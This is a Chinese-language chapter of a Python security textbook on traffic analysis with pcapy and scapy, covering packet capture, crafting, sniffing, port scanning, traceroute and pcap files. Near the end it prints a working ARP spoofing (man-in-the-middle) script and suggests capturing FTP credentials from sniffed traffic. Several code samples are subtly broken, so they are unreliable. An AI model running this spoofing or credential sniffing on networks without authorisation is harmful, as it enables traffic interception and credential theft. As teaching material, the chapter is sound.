# 分析网络流量

本章将介绍使用 Python 中的 pcapy 和 scapy 模块分析网络流量的一些基础知识。这些模块为调查员提供了编写小型 Python 脚本来调查网络流量的能力。调查员可以编写 scapy 脚本来调查通过嗅探混杂网络接口的实时流量，或者加载先前捕获的 pcap 文件。

本章将涵盖以下主题：

+   使用 pcapy 包在网络上捕获和注入数据包

+   使用 scapy 包捕获、分析、操作和注入网络数据包

+   使用 scapy 包在网络中进行端口扫描和跟踪路由

+   使用 scapy 包读取 pcap 文件

# 技术要求

本章的示例和源代码可在 GitHub 存储库的`第五章`文件夹中找到：[`github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security`](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)。

您需要在本地计算机上安装 Python 发行版，并对数据包、捕获和使用诸如 Wireshark 之类的工具嗅探网络具有一些基本知识。还建议使用 Unix 发行版以便于安装和使用 scapy 以及执行命令。

# 使用 pcapy 捕获和注入数据包

在本节中，您将学习 pcapy 的基础知识以及如何捕获和读取数据包的头部。

# Pcapy 简介

Pcapy 是一个 Python 扩展模块，它与`libpcap`数据包捕获库进行接口。Pcapy 使 Python 脚本能够在网络上捕获数据包。Pcapy 在与其他 Python 类集合一起使用构建和处理数据包时非常有效。

您可以在[`github.com/CoreSecurity/pcapy`](https://github.com/CoreSecurity/pcapy)下载源代码和最新的稳定和开发版本。

要在 Ubuntu Linux 发行版上安装`python-pcapy`，请运行以下命令：

```py
sudo apt-get update
sudo apt-get install python-pcapy
```

# 使用 pcapy 捕获数据包

我们可以使用 pcapy 接口中的`open_live`方法来捕获特定设备中的数据包，并且可以指定每次捕获的字节数以及其他参数，如混杂模式和超时。

在下面的例子中，我们将计算捕获 eht0 接口的数据包。

您可以在**`capturing_packets.py`**文件中找到以下代码：

```py
#!/usr/bin/python
import pcapy
devs = pcapy.findalldevs()
print(devs)
#  device, bytes to capture per packet, promiscuous mode, timeout (ms)
cap = pcapy.open_live("eth0", 65536 , 1 , 0)
count = 1
while count:
    (header, payload) = cap.next()
    print(count)
    count = count + 1
```

# 从数据包中读取头部

在下面的例子中，我们正在捕获特定设备（`eth0`）中的数据包，并且对于每个数据包，我们获取头部和有效载荷，以提取有关 Mac 地址、IP 头和协议的信息。

您可以在**`reading_headers.py`**文件中找到以下代码：

```py
#!/usr/bin/python
import pcapy
from struct import *
cap = pcapy.open_live("eth0", 65536, 1, 0)
while 1:
    (header,payload) = cap.next()
    l2hdr = payload[:14]
    l2data = unpack("!6s6sH", l2hdr)
    srcmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(l2hdr[0]), ord(l2hdr[1]), ord(l2hdr[2]), ord(l2hdr[3]), ord(l2hdr[4]), ord(l2hdr[5]))
    dstmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(l2hdr[6]), ord(l2hdr[7]), ord(l2hdr[8]), ord(l2hdr[9]), ord(l2hdr[10]), ord(l2hdr[11]))
    print("Source MAC: ", srcmac, " Destination MAC: ", dstmac)
    # get IP header from bytes 14 to 34 in payload
    ipheader = unpack('!BBHHHBBH4s4s' , payload[14:34])
    timetolive = ipheader[5]
    protocol = ipheader[6]
    print("Protocol ", str(protocol), " Time To Live: ", str(timetolive))
```

# 使用 scapy 捕获和注入数据包

网络流量分析是拦截两个主机之间交换的数据包的过程，了解介入通信的系统的细节。消息和通信持续时间是监听网络媒介的攻击者可以获取的一些有价值的信息。

# 我们可以用 scapy 做什么？

Scapy 是用于网络操作的瑞士军刀。因此，它可以用于许多任务和领域：

+   通信网络研究

+   安全测试和道德黑客以操纵生成的流量

+   数据包捕获、处理和处理

+   使用特定协议生成数据包

+   显示有关特定包的详细信息

+   数据包捕获、制作和操作

+   网络流量分析工具

+   模糊协议和 IDS/IPS 测试

+   无线发现工具

# Scapy 的优点和缺点

以下是 Scapy 的一些优点：

+   支持多种网络协议

+   其 API 提供了在网络段中捕获数据包并在捕获每个数据包时执行函数所需的类

+   它可以在命令解释器模式下执行，也可以从 Python 脚本中以编程方式使用

+   它允许我们在非常低的级别上操纵网络流量

+   它允许我们使用协议堆栈并将它们组合起来

+   它允许我们配置每个协议的所有参数

此外，Scapy 也有一些弱点：

+   无法同时处理大量数据包

+   对某些复杂协议的部分支持

# Scapy 简介

`Scapy`是用 Python 编写的模块，用于操作支持多种网络协议的数据包。它允许创建和修改各种类型的网络数据包，实现了捕获和嗅探数据包的功能，然后对这些数据包执行操作。

`Scapy`是一种专门用于操作网络数据包和帧的软件。Scapy 是用 Python 编程语言编写的，可以在其**CLI（命令行解释器）**中交互使用，也可以作为 Python 程序中的库使用。

**Scapy 安装：**我建议在 Linux 系统上使用 Scapy，因为它是为 Linux 设计的。最新版本的 Scapy 确实支持 Windows，但在本章中，我假设您使用的是具有完全功能的 Scapy 安装的 Linux 发行版。要安装 Scapy，请访问[`www.secdev.org/projects/scapy`](http://www.secdev.org/projects/scapy)。安装说明在官方安装指南中有详细说明：[`scapy.readthedocs.io/en/latest/`](https://scapy.readthedocs.io/en/latest/)

# Scapy 命令

Scapy 为我们提供了许多用于调查网络的命令。我们可以以两种方式使用 Scapy：在终端窗口中交互式使用，或者通过将其作为 Python 脚本的库导入来以编程方式使用。

以下是可能有用的命令，可以详细显示 Scapy 的操作：

+   `**ls()**`：显示 Scapy 支持的所有协议

+   `**lsc()**`：显示 Scapy 支持的命令和函数列表

+   `**conf**`：显示所有配置选项

+   `**help()**`：显示特定命令的帮助信息，例如，help(sniff)

+   `**show()**`：显示特定数据包的详细信息，例如，Newpacket.show()

Scapy 支持大约 300 种网络协议。我们可以通过**ls()**命令来了解一下：

```py
scapy>ls()
```

屏幕截图显示了 ls()命令的执行，我们可以看到 Scapy 支持的一些协议：

![](img/edfaf3de-5216-4501-a3f3-0028e4b2e7dd.png)

如果我们执行**ls()**命令，可以看到可以在特定层发送的参数，括号中指示我们想要更多信息的层：

```py
scapy>ls(IP)
scapy>ls(ICMP)
scapy>ls(TCP)
```

下一个屏幕截图显示了**ls(TCP)**命令的执行，我们可以看到 Scapy 中 TCP 协议支持的字段：

![](img/1804705b-5e6a-46f0-ae6d-4a4521af6678.png)

```py
scapy>lsc()
```

通过`lsc()`命令，我们可以看到 Scapy 中可用的函数：

![](img/3b545bf7-fec8-4173-921b-7ac83b913c65.png)

Scapy 帮助我们在 TCP/IP 协议的任何一层中创建自定义数据包。在下面的示例中，我们在交互式 Scapy shell 中创建了 ICMP/IP 数据包。数据包是通过从物理层（以太网）开始的层创建的，直到达到数据层。

这是 Scapy 通过层管理的结构：

![](img/8b6047ac-e6a8-4c20-ab8f-b688e9039617.png)

在 Scapy 中，一个层通常代表一个协议。网络协议以堆栈的形式结构化，每一步都由一个层或协议组成。网络包由多个层组成，每个层负责通信的一部分。

在 Scapy 中，数据包是一组结构化数据，准备好发送到网络。数据包必须遵循逻辑结构，根据您想要模拟的通信类型。如果要发送 TCP/IP 数据包，必须遵循 TCP/IP 标准中定义的协议规则。

默认情况下，`IP layer()`被配置为目标 IP 为 127.0.0.1，这指的是 Scapy 运行的本地机器。如果我们希望将数据包发送到另一个 IP 或域，我们将不得不配置 IP 层。

以下命令将在 IP 和 ICMP 层创建一个数据包：

```py
scapy>icmp=IP(dst='google.com')/ICMP()
```

此外，我们还可以在其他层创建数据包：

```py
scapy>tcp=IP(dst='google.com')/TCP(dport=80)
scapy>packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD"
```

使用`show()`方法，我们可以查看特定数据包的详细信息。`show()`和`show2()`之间的区别在于，`show2()`函数显示的是数据包在网络上发送的样子：

```py
scapy> packet.show()
scapy> packet.show2()
```

我们可以看到特定数据包的结构：

```py
scapy> ls (packet)
```

Scapy 逐层创建和分析数据包。Scapy 中的数据包是 Python 字典，因此每个数据包都是一组嵌套的字典，每个层都是主层的子字典。**summary()**方法将提供每个数据包层的详细信息：

```py
>>> packet[0].summary()
```

有了这些功能，我们可以以更友好和简化的格式看到接收到的数据包：

```py
scapy> _.show()
scapy> _.summary()
```

# 使用 scapy 发送数据包

要发送 scapy 中的数据包，我们有两种方法：

+   **send():**发送第三层数据包

+   **sendp():**发送第二层数据包

如果我们从第三层或 IP 发送数据包并信任操作系统本身的路由来发送它，我们将使用`send()`。如果我们需要在第二层（例如以太网）进行控制，我们将使用`sendp()`。

发送命令的主要参数是：

+   **iface:**发送数据包的接口。

+   **Inter:**我们希望在发送数据包之间经过的时间，以秒为单位。

+   **loop:**设置为 1 以无限地发送数据包。如果不为 0，则以无限循环发送数据包，直到我们按下*Ctrl* + *C*停止。

+   **packet:**数据包或数据包列表。

+   **verbose:**允许我们更改日志级别，甚至完全停用（值为 0）。

现在我们使用 send 方法发送前面的数据包**第三层**：

```py
>> send(packet)
```

发送**第二层**数据包，我们必须添加一个以太网层，并提供正确的接口来发送数据包：

```py
>>> sendp(Ether()/IP(dst="packtpub.com")/ICMP()/"Layer 2 packet",iface="eth0")
```

使用`sendp()`函数，我们将数据包发送到相应的目的地：

```py
scapy> sendp(packet)
```

使用 inter 和 loop 选项，我们可以以循环的形式每 N 秒无限地发送数据包：

```py
scapy>sendp(packet, loop=1, inter=1)
```

`sendp (...)`函数的工作方式与`send (...)`完全相同，不同之处在于它在第二层中工作。这意味着不需要系统路由，信息将直接通过作为函数参数指示的网络适配器发送。即使通过任何系统路由似乎没有通信，信息也将被发送。

此函数还允许我们指定目标网络卡的物理或 MAC 地址。如果我们指定地址，scapy 将尝试自动解析本地和远程地址：

![](img/8229382d-c9e7-423e-a855-1fb4eadbb0e7.png)

`send`和`sendp`函数允许我们将所需的信息发送到网络，但不允许我们接收答案。

有许多方法可以接收我们生成的数据包的响应，但对于交互模式最有用的是`sr`函数系列（来自英文缩写：发送和接收）。

我们可以使用 Python 脚本执行相同的操作。首先，我们需要导入`scapy`模块。

您可以在`**scapy_icmp_google.py**`文件中找到以下代码：

```py
#!/usr/bin/python
import sys
from scapy.all import *

p=Ether()/IP(dst='www.google.com')/ICMP()
send(p)
```

用于发送和接收数据包的函数系列包括以下内容：

+   **sr (...):**发送并接收数据包，或数据包列表到网络。等待所有发送的数据包都收到响应。重要的是要注意，此函数在第三层中工作。换句话说，要知道如何发送数据包，请使用系统的路由。如果没有路由将数据包发送到所需的目的地，它将无法发送。

+   **sr1 (...)**：与`sr (...)`函数的工作方式相同，只是它只捕获收到的第一个响应，并忽略其他响应（如果有）。

+   **srp (...)**：它的操作与`sr (...)`函数相同，但在第 2 层。也就是说，它允许我们通过特定的网络卡发送信息。即使没有路由，信息也会被发送。

+   **srp1 (...):** 其操作与`sr1 (...)`函数相同，但在第 2 层。

+   **srbt (...)**：通过蓝牙连接发送信息。

+   **srloop (...)**：允许我们发送和接收信息`N`次。也就是说，我们可以告诉它发送一个包三次，因此，我们将按顺序接收三个包的响应。它还允许我们指定在接收到包时要采取的操作以及在没有收到响应时要采取的操作。

+   **srploop (...)**：与`srloop`相同，但在第 2 层工作。

如果我们想要发送和接收数据包，并有可能看到响应数据包，那么 srp1 函数可能会有用。

在下面的例子中，我们构建了一个 ICMP 数据包，并使用`sr1`发送：

![](img/d3c98aff-84ce-498f-a79d-550ff872e03b.png)

这个数据包是对 Google 的 TCP 连接的回应。

我们可以看到它有三层（以太网，IP 和 TCP）：

![](img/9e4cd29a-9d7d-4782-b8f2-c21fb5f1e509.png)

# 使用 scapy 进行数据包嗅探

大多数网络使用广播技术（查看信息），这意味着设备在网络上传输的每个数据包都可以被连接到网络的任何其他设备读取。

WiFi 网络和带有 HUB 设备的网络使用这种方法，但是路由器和交换机等智能设备只会将数据包路由并传递给其路由表中可用的机器。有关广播网络的更多信息可以在[`en.wikipedia.org/wiki/Broadcasting_(networking)`](https://en.wikipedia.org/wiki/Broadcasting_(networking))找到。

实际上，除了消息的接收者之外的所有计算机都会意识到消息不是为它们而设计的，并将其忽略。然而，许多计算机可以被编程为查看通过网络传输的每条消息。

scapy 提供的一个功能是嗅探通过接口传递的网络数据包。让我们创建一个简单的 Python 脚本来嗅探本地机器网络接口上的流量。

Scapy 提供了一种嗅探数据包并解析其内容的方法：

```py
sniff(filter="",iface="any",prn=function,count=N)
```

使用嗅探函数，我们可以像 tcpdump 或 Wireshark 等工具一样捕获数据包，指示我们要收集流量的网络接口以及一个计数器，指示我们要捕获的数据包数量：

```py
scapy> pkts = sniff (iface = "eth0", count = 3)
```

现在我们将详细介绍嗅探函数的每个参数。**sniff()**方法的参数如下：

+   **count**：要捕获的数据包数量，但 0 表示无限

+   **iface**：要嗅探的接口；仅在此接口上嗅探数据包

+   **prn**：要在每个数据包上运行的函数

+   **store**：是否存储或丢弃嗅探到的数据包；当我们只需要监视它们时设置为 0

+   **timeout**：在给定时间后停止嗅探；默认值为 none

+   **filter**：采用 BPF 语法过滤器来过滤嗅探

我们可以突出显示`prn`参数，该参数提供了要应用于每个数据包的函数：

![](img/412d3fa6-d502-4715-9680-bdc7a1dc9549.png)

这个参数将出现在许多其他函数中，并且正如文档中所述，它是指一个函数作为输入参数。

在`sniff()`函数的情况下，这个函数将被应用于每个捕获的数据包。这样，每当`sniff()`函数拦截一个数据包时，它将以拦截的数据包作为参数调用这个函数。

这个功能给了我们很大的力量，想象一下，我们想要构建一个拦截所有通信并存储网络中所有检测到的主机的脚本。使用这个功能将会非常简单：

```py
> packet=sniff(filter="tcp", iface="eth0", prn=lambda x:x.summary())
```

在下面的例子中，我们可以看到在 eth0 接口捕获数据包后执行`lambda`函数的结果：

![](img/6b4b64e9-85fd-4437-b4ef-3ad8a1fd5a7e.png)

在下面的例子中，我们使用`scapy`模块中的 sniff 方法。我们正在使用此方法来捕获`eth0`接口的数据包。在`print_packet`函数内，我们正在获取数据包的 IP 层。

您可以在**`sniff_main_thread.py`**文件中找到以下代码：

```py
from scapy.all import *
interface = "eth0"
def print_packet(packet):
    ip_layer = packet.getlayer(IP)
    print("[!] New Packet: {src} -> {dst}".format(src=ip_layer.src, dst=ip_layer.dst))

print("[*] Start sniffing...")
sniff(iface=interface, filter="ip", prn=print_packet)
print("[*] Stop sniffing")
```

在下面的例子中，我们使用`scapy`模块中的 sniff 方法。该方法的参数是您想要捕获数据包的接口，filter 参数用于指定要过滤的数据包。prn 参数指定要调用的函数，并将数据包作为参数发送到函数。在这种情况下，我们自定义的函数是`sniffPackets`。

在`sniffPackets`函数内，我们正在检查捕获的数据包是否具有 IP 层，如果有 IP 层，则我们存储捕获的数据包的源、目的地和 TTL 值，并将它们打印出来。

您可以在**`sniff_packets.py`**文件中找到以下代码：

```py
#import scapy module to python
from scapy.all import *

# custom custom packet sniffer action method
def sniffPackets(packet):
 if packet.haslayer(IP):
     pckt_src=packet[IP].src
     pckt_dst=packet[IP].dst
     pckt_ttl=packet[IP].ttl
     print "IP Packet: %s is going to %s and has ttl value %s" (pckt_src,pckt_dst,pckt_ttl)

def main():
 print "custom packet sniffer"
 #call scapy’s sniff method
 sniff(filter="ip",iface="wlan0",prn=sniffPackets)

 if __name__ == '__main__':
     main()
```

# 使用 scapy 的 Lambda 函数

`sniff`函数的另一个有趣特性是它具有“`prn`”属性，允许我们每次捕获数据包时执行一个函数。如果我们想要操作和重新注入数据包，这非常有用：

```py
scapy> packetsICMP = sniff(iface="eth0",filter="ICMP", prn=lambda x:x.summary())
```

例如，如果我们想要捕获 TCP 协议的 n 个数据包，我们可以使用 sniff 方法来实现：

```py
scapy> a = sniff(filter="TCP", count=n)
```

在此指令中，我们正在捕获 TCP 协议的 100 个数据包：

```py
scapy> a = sniff(filter="TCP", count=100)
```

在下面的例子中，我们看到了如何对捕获的数据包应用自定义操作。我们定义了一个`customAction`方法，该方法以数据包作为参数。对于`sniff`函数捕获的每个数据包，我们调用此方法并递增`packetCount`。

您可以在**`sniff_packets_customAction.py`**文件中找到以下代码：

```py
import scapy module
from scapy.all import *

## create a packet count var
packetCount = 0
## define our custom action function
def customAction(packet):
 packetCount += 1
 return "{} {} {}".format(packetCount, packet[0][1].src, packet[0][1].dst)
## setup sniff, filtering for IP traffic
sniff(filter="IP",prn=customAction)
```

此外，我们还可以使用`sniff`函数和**ARP 过滤**来监视 ARP 数据包。

您可以在**`sniff_packets_arp.py`**文件中找到以下代码：

```py
from scapy.all import *

def arpDisplay(pkt):
 if pkt[ARP].op == 1: #request
    x= "Request: {} is asking about {} ".format(pkt[ARP].psrc,pkt[ARP].pdst)
    print x
 if pkt[ARP].op == 2: #response
     x = "Response: {} has address {}".format(pkt[ARP].hwsrc,pkt[ARP].psrc)
     print x

sniff(prn=arpDisplay, filter="ARP", store=0, count=10)
```

# 过滤 UDP 数据包

在下面的例子中，我们看到了如何定义一个函数，每当进行**DNS 请求**时，都会执行该函数以获得 UDP 类型的数据包：

```py
scapy> a = sniff(filter="UDP and port 53",count=100,prn=count_dns_request)
```

可以通过命令行以这种方式定义此函数。首先，我们定义一个名为`DNS_QUERIES`的全局变量，当 scapy 发现使用 UDP 协议和端口 53 的数据包时，它将调用此函数来增加此变量，这表明通信中存在 DNS 请求：

```py
>>> DNS_QUERIES=0
>>> def count_dns_request(package):
>>>    global DNS_QUERIES
>>>    if DNSQR in package:
>>>        DNS_QUERIES +=1
```

# 使用 scapy 进行端口扫描和跟踪路由

在这一点上，我们将在某个网络段上看到一个端口扫描程序。与 nmap 一样，使用 scapy，我们也可以执行一个简单的端口扫描程序，告诉我们特定主机和端口列表是否打开或关闭。

# 使用 scapy 进行端口扫描

在下面的例子中，我们看到我们已经定义了一个`analyze_port()`函数，该函数的参数是要分析的主机和端口。

您可以在**`port_scan_scapy.py`**文件中找到以下代码：

```py
from scapy.all import sr1, IP, TCP

OPEN_PORTS = []

def analyze_port(host, port):
 """
 Function that determines the status of a port: Open / closed
 :param host: target
 :param port: port to test
 :type port: int
 """

 print "[ii] Scanning port %s" % port
 res = sr1(IP(dst=host)/TCP(dport=port), verbose=False, timeout=0.2)
 if res is not None and TCP in res:
     if res[TCP].flags == 18:
         OPEN_PORTS.append(port)
         print "Port %s open" % port

def main():
 for x in xrange(0, 80):
     analyze_port("domain", x)
 print "[*] Open ports:"
 for x in OPEN_PORTS:
     print " - %s/TCP" % x
```

# 使用 scapy 进行跟踪路由命令

跟踪路由是一种网络工具，可在 Linux 和 Windows 中使用，允许您跟踪数据包（IP 数据包）从计算机 A 到计算机 B 的路由。

默认情况下，数据包通过互联网发送，但数据包的路由可能会有所不同，如果链路故障或更改提供者连接的情况下。

一旦数据包被发送到接入提供商，数据包将被发送到中间路由器，将其传送到目的地。数据包在传输过程中可能会发生变化。如果中间节点或机器的数量太多，数据包的生存期到期，它也可能永远无法到达目的地。

在下面的例子中，我们将研究使用 scapy 进行跟踪路由的可能性。

使用 scapy，IP 和 UDP 数据包可以按以下方式构建：

```py
from scapy.all import *
ip_packet = IP(dst="google.com", ttl=10)
udp_packet = UDP(dport=40000)
full_packet = IP(dst="google.com", ttl=10) / UDP(dport=40000)
```

要发送数据包，使用`send`函数：

```py
send(full_packet)
```

IP 数据包包括一个属性（TTL），其中指示数据包的生存时间。因此，每当设备接收到 IP 数据包时，它会将 TTL（数据包生存时间）减少 1，并将其传递给下一个设备。基本上，这是一种确保数据包不会陷入无限循环的聪明方式。

要实现 traceroute，我们发送一个 TTL = i 的 UDP 数据包，其中 i = 1,2,3, n，并检查响应数据包，以查看我们是否已到达目的地，以及我们是否需要继续为我们到达的每个主机进行跳转。

您可以在**`traceroute_scapy.py`**文件中找到以下代码：

```py
from scapy.all import *
hostname = "google.com"
for i in range(1, 28):
    pkt = IP(dst=hostname, ttl=i) / UDP(dport=33434)
    # Send package and wait for an answer
    reply = sr1(pkt, verbose=0)
    if reply is None:
    # No reply
       break
    elif reply.type == 3:
    # the destination has been reached
        print "Done!", reply.src
        break
    else:
    # We’re in the middle communication
        print "%d hops away: " % i , reply.src
```

在下面的屏幕截图中，我们可以看到执行 traceroute 脚本的结果。我们的目标是 IP 地址 216.58.210.142，我们可以看到直到到达目标的跳数：

![](img/7e8ec4d6-7168-408c-8928-3a733b319b68.png)

此外，我们还可以看到每一跳的所有机器，直到到达我们的目标：

![](img/02dfb561-eff6-43b3-9ca4-d5b1730eb5c1.png)

# 使用 scapy 读取 pcap 文件

在本节中，您将学习读取 pcap 文件的基础知识。PCAP（数据包捕获）是指允许您捕获网络数据包以进行处理的 API。PCAP 格式是一种标准，几乎所有网络分析工具都使用它，如 TCPDump、WinDump、Wireshark、TShark 和 Ettercap。

# PCAP 格式简介

类似地，使用这种技术捕获的信息存储在扩展名为.pcap 的文件中。该文件包含帧和网络数据包，如果我们需要保存网络分析的结果以供以后处理，它非常有用。

如果我们需要保存网络分析的结果以供以后处理，或者作为工作成果的证据，这些文件非常有用。.pcap 文件中存储的信息可以被分析多次，而不会改变原始文件。

Scapy 包含两个用于处理 PCAP 文件的函数，它们允许我们对其进行读取和写入：

+   `rdcap()`**：**读取并加载.pcap 文件。

+   `wdcap()`**：**将一个包列表的内容写入.pcap 文件。

# 使用 scapy 读取 pcap 文件

使用`rdpcap()`函数，我们可以读取`pcap`文件并获得一个可以直接从 Python 处理的包列表：

```py
scapy> file=rdpcap('<path_file.pcap>')
scapy> file.summary()
scapy> file.sessions()
scapy> file.show()
```

# 编写一个 pcap 文件

使用`wrpcap()`函数，我们可以将捕获的数据包存储在 pcap 文件中。此外，还可以使用 Scapy 将数据包写入 pcap 文件。要将数据包写入 pcap 文件，我们可以使用`wrpcap()`方法。在下面的示例中，我们正在捕获 FTP 传输的 tcp 数据包，并将这些数据包保存在 pcap 文件中：

```py
scapy > packets = sniff(filter='tcp port 21')
 scapy> file=wrpcap('<path_file.pcap>',packets)
```

# 使用 scapy 从 pcap 文件中嗅探

使用`rdpcap()`函数，我们可以读取 pcap 文件并获得一个可以直接从 Python 处理的包列表：

```py
scapy> file=rdpcap('<path_file.pcap>')
```

我们还可以从读取 pcap 文件中进行类似的数据包捕获：

```py
scapy> pkts = sniff(offline="file.pcap")
```

Scapy 支持 B**PF（Beerkeley Packet Filters）**格式，这是一种应用于网络数据包的过滤器的标准格式。这些过滤器可以应用于一组特定的数据包，也可以直接应用于活动捕获：

```py
>>> sniff (filter = "ip and host 195.221.189.155", count = 2)
<Sniffed TCP: 2 UDP: 0 ICMP: 0 Other: 0>
```

我们可以格式化 sniff()的输出，使其适应我们想要查看的数据，并按我们想要的方式对其进行排序。我们将使用**“tcp and (port 443 or port 80)”**激活过滤器，并使用**prn = lamba x: x.sprintf**来捕获 HTTP 和 HTTPS 流量。我们想以以下方式显示以下数据：

+   源 IP 和原始端口

+   目标 IP 和目标端口

+   TCP 标志或标志

+   TCP 段的有效载荷

我们可以查看`sniff`函数的参数：

```py
sniff(filter="tcp and (port 443 or port 80)",prn=lambda x:x.sprintf("%.time% %-15s,IP.src% -> %-15s,IP.dst% %IP.chksum% %03xr, IP.proto% %r,TCP.flags%"))
```

在下面的示例中，我们可以看到在捕获数据包并应用过滤器后执行 sniff 函数的结果：

![](img/a04b900f-9919-4596-a73b-d048281311c5.png)

协议输出现在不是 TCP、UDP 等，而是十六进制值：

**006 指的是 IP 协议字段**；它指的是数据部分中使用的下一级协议。长度为 8 位。在这种情况下，十六进制（06）（00000110）= TCP 在十进制中为 6。

2、16、18、24 等是 TCP 头部的标志，以十六进制格式表示。例如，18 在二进制中是 11000，正如我们已经知道的那样，这将激活 ACK + PSH。

# 使用 scapy 进行网络取证

Scapy 还可用于从 SQL 注入攻击中执行网络取证或从服务器提取 ftp 凭据。通过使用 Python scapy 库，我们可以确定攻击者何时/在哪里/如何执行 SQL 注入。借助 Python scapy 库的帮助，我们可以分析网络数据包的 pcap 文件。

使用 scapy，我们可以分析网络数据包并检测攻击者是否正在执行 SQL 注入。

我们将能够分析、拦截和解剖网络数据包，并重用它们的内容。我们有能力操作由我们捕获或生成的 PCAP 文件中的信息。

例如，我们可以开发一个简单的 ARP MITM 攻击脚本。

您可以在**`arp_attack_mitm.py` **文件中找到以下代码：

```py
from scapy.all import *
import time

op=1 # Op code 1 for query arp
victim="<victim_ip>" # replace with the victim's IP
spoof="<ip_gateway>" # replace with the IP of the gateway
mac="<attack_mac_address>" # replace with the attacker's MAC address

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while True:
 send(arp)
 time.sleep(2)
```

# 摘要

在本章中，我们研究了使用各种 Python 模块进行数据包构建和嗅探的基础知识，并且发现 scapy 非常强大且易于使用。到目前为止，我们已经学会了套接字编程和 scapy 的基础知识。在我们的安全评估中，我们可能需要原始输出和对数据包拓扑的基本级别访问，以便我们可以分析信息并自行做出决定。scapy 最吸引人的部分是可以导入并用于创建网络工具，而无需从头开始创建数据包。

在下一章中，我们将探讨使用 Python 编程包从具有 shodan 等服务的服务器中提取公共信息。

# 问题

1.  可以捕获数据包的 scapy 函数与 tcpdump 或 Wireshark 等工具的方式相同吗？

1.  用 scapy 无限制地每五秒发送一个数据包的最佳方法是什么？

1.  必须使用 scapy 调用的方法来检查某台机器（主机）上的某个端口（端口）是打开还是关闭，并显示有关发送的数据包的详细信息是什么？

1.  在 scapy 中实现 traceroute 命令需要哪些功能？

1.  哪个 Python 扩展模块与 libpcap 数据包捕获库进行接口？

1.  pcapy 接口中的哪个方法允许我们在特定设备上捕获数据包？

1.  在 Scapy 中发送数据包的方法是什么？

1.  sniff 函数的哪个参数允许我们定义一个将应用于每个捕获数据包的函数？

1.  scapy 支持哪种格式来对网络数据包应用过滤器？

1.  允许您跟踪数据包（IP 数据包）从计算机 A 到计算机 B 的路由的命令是什么？

# 进一步阅读

在这些链接中，您将找到有关提到的工具以及一些评论模块的官方 Python 文档的更多信息：

+   [`www.secdev.org/projects/scapy`](http://www.secdev.org/projects/scapy)

+   [`www.secdev.org/projects/scapy/build_your_own_tools.html`](http://www.secdev.org/projects/scapy/build_your_own_tools.html)

+   [`scapy.readthedocs.io/en/latest/usage.html`](http://scapy.readthedocs.io/en/latest/usage.html)

+   [`github.com/CoreSecurity/pcapy`](https://github.com/CoreSecurity/pcapy)

基于 scapy 的工具：

+   [`github.com/nottinghamprisateam/pyersinia`](https://github.com/nottinghamprisateam/pyersinia)

+   [`github.com/adon90/sneaky_arpspoofing`](https://github.com/adon90/sneaky_arpspoofing)

+   [`github.com/tetrillard/pynetdiscover`](https://github.com/tetrillard/pynetdiscover)

pyNetdiscover 是一种主动/被动地址侦察工具和 ARP 扫描仪，其要求是 python2.7 和`scapy`、`argparse`和`netaddr`模块。
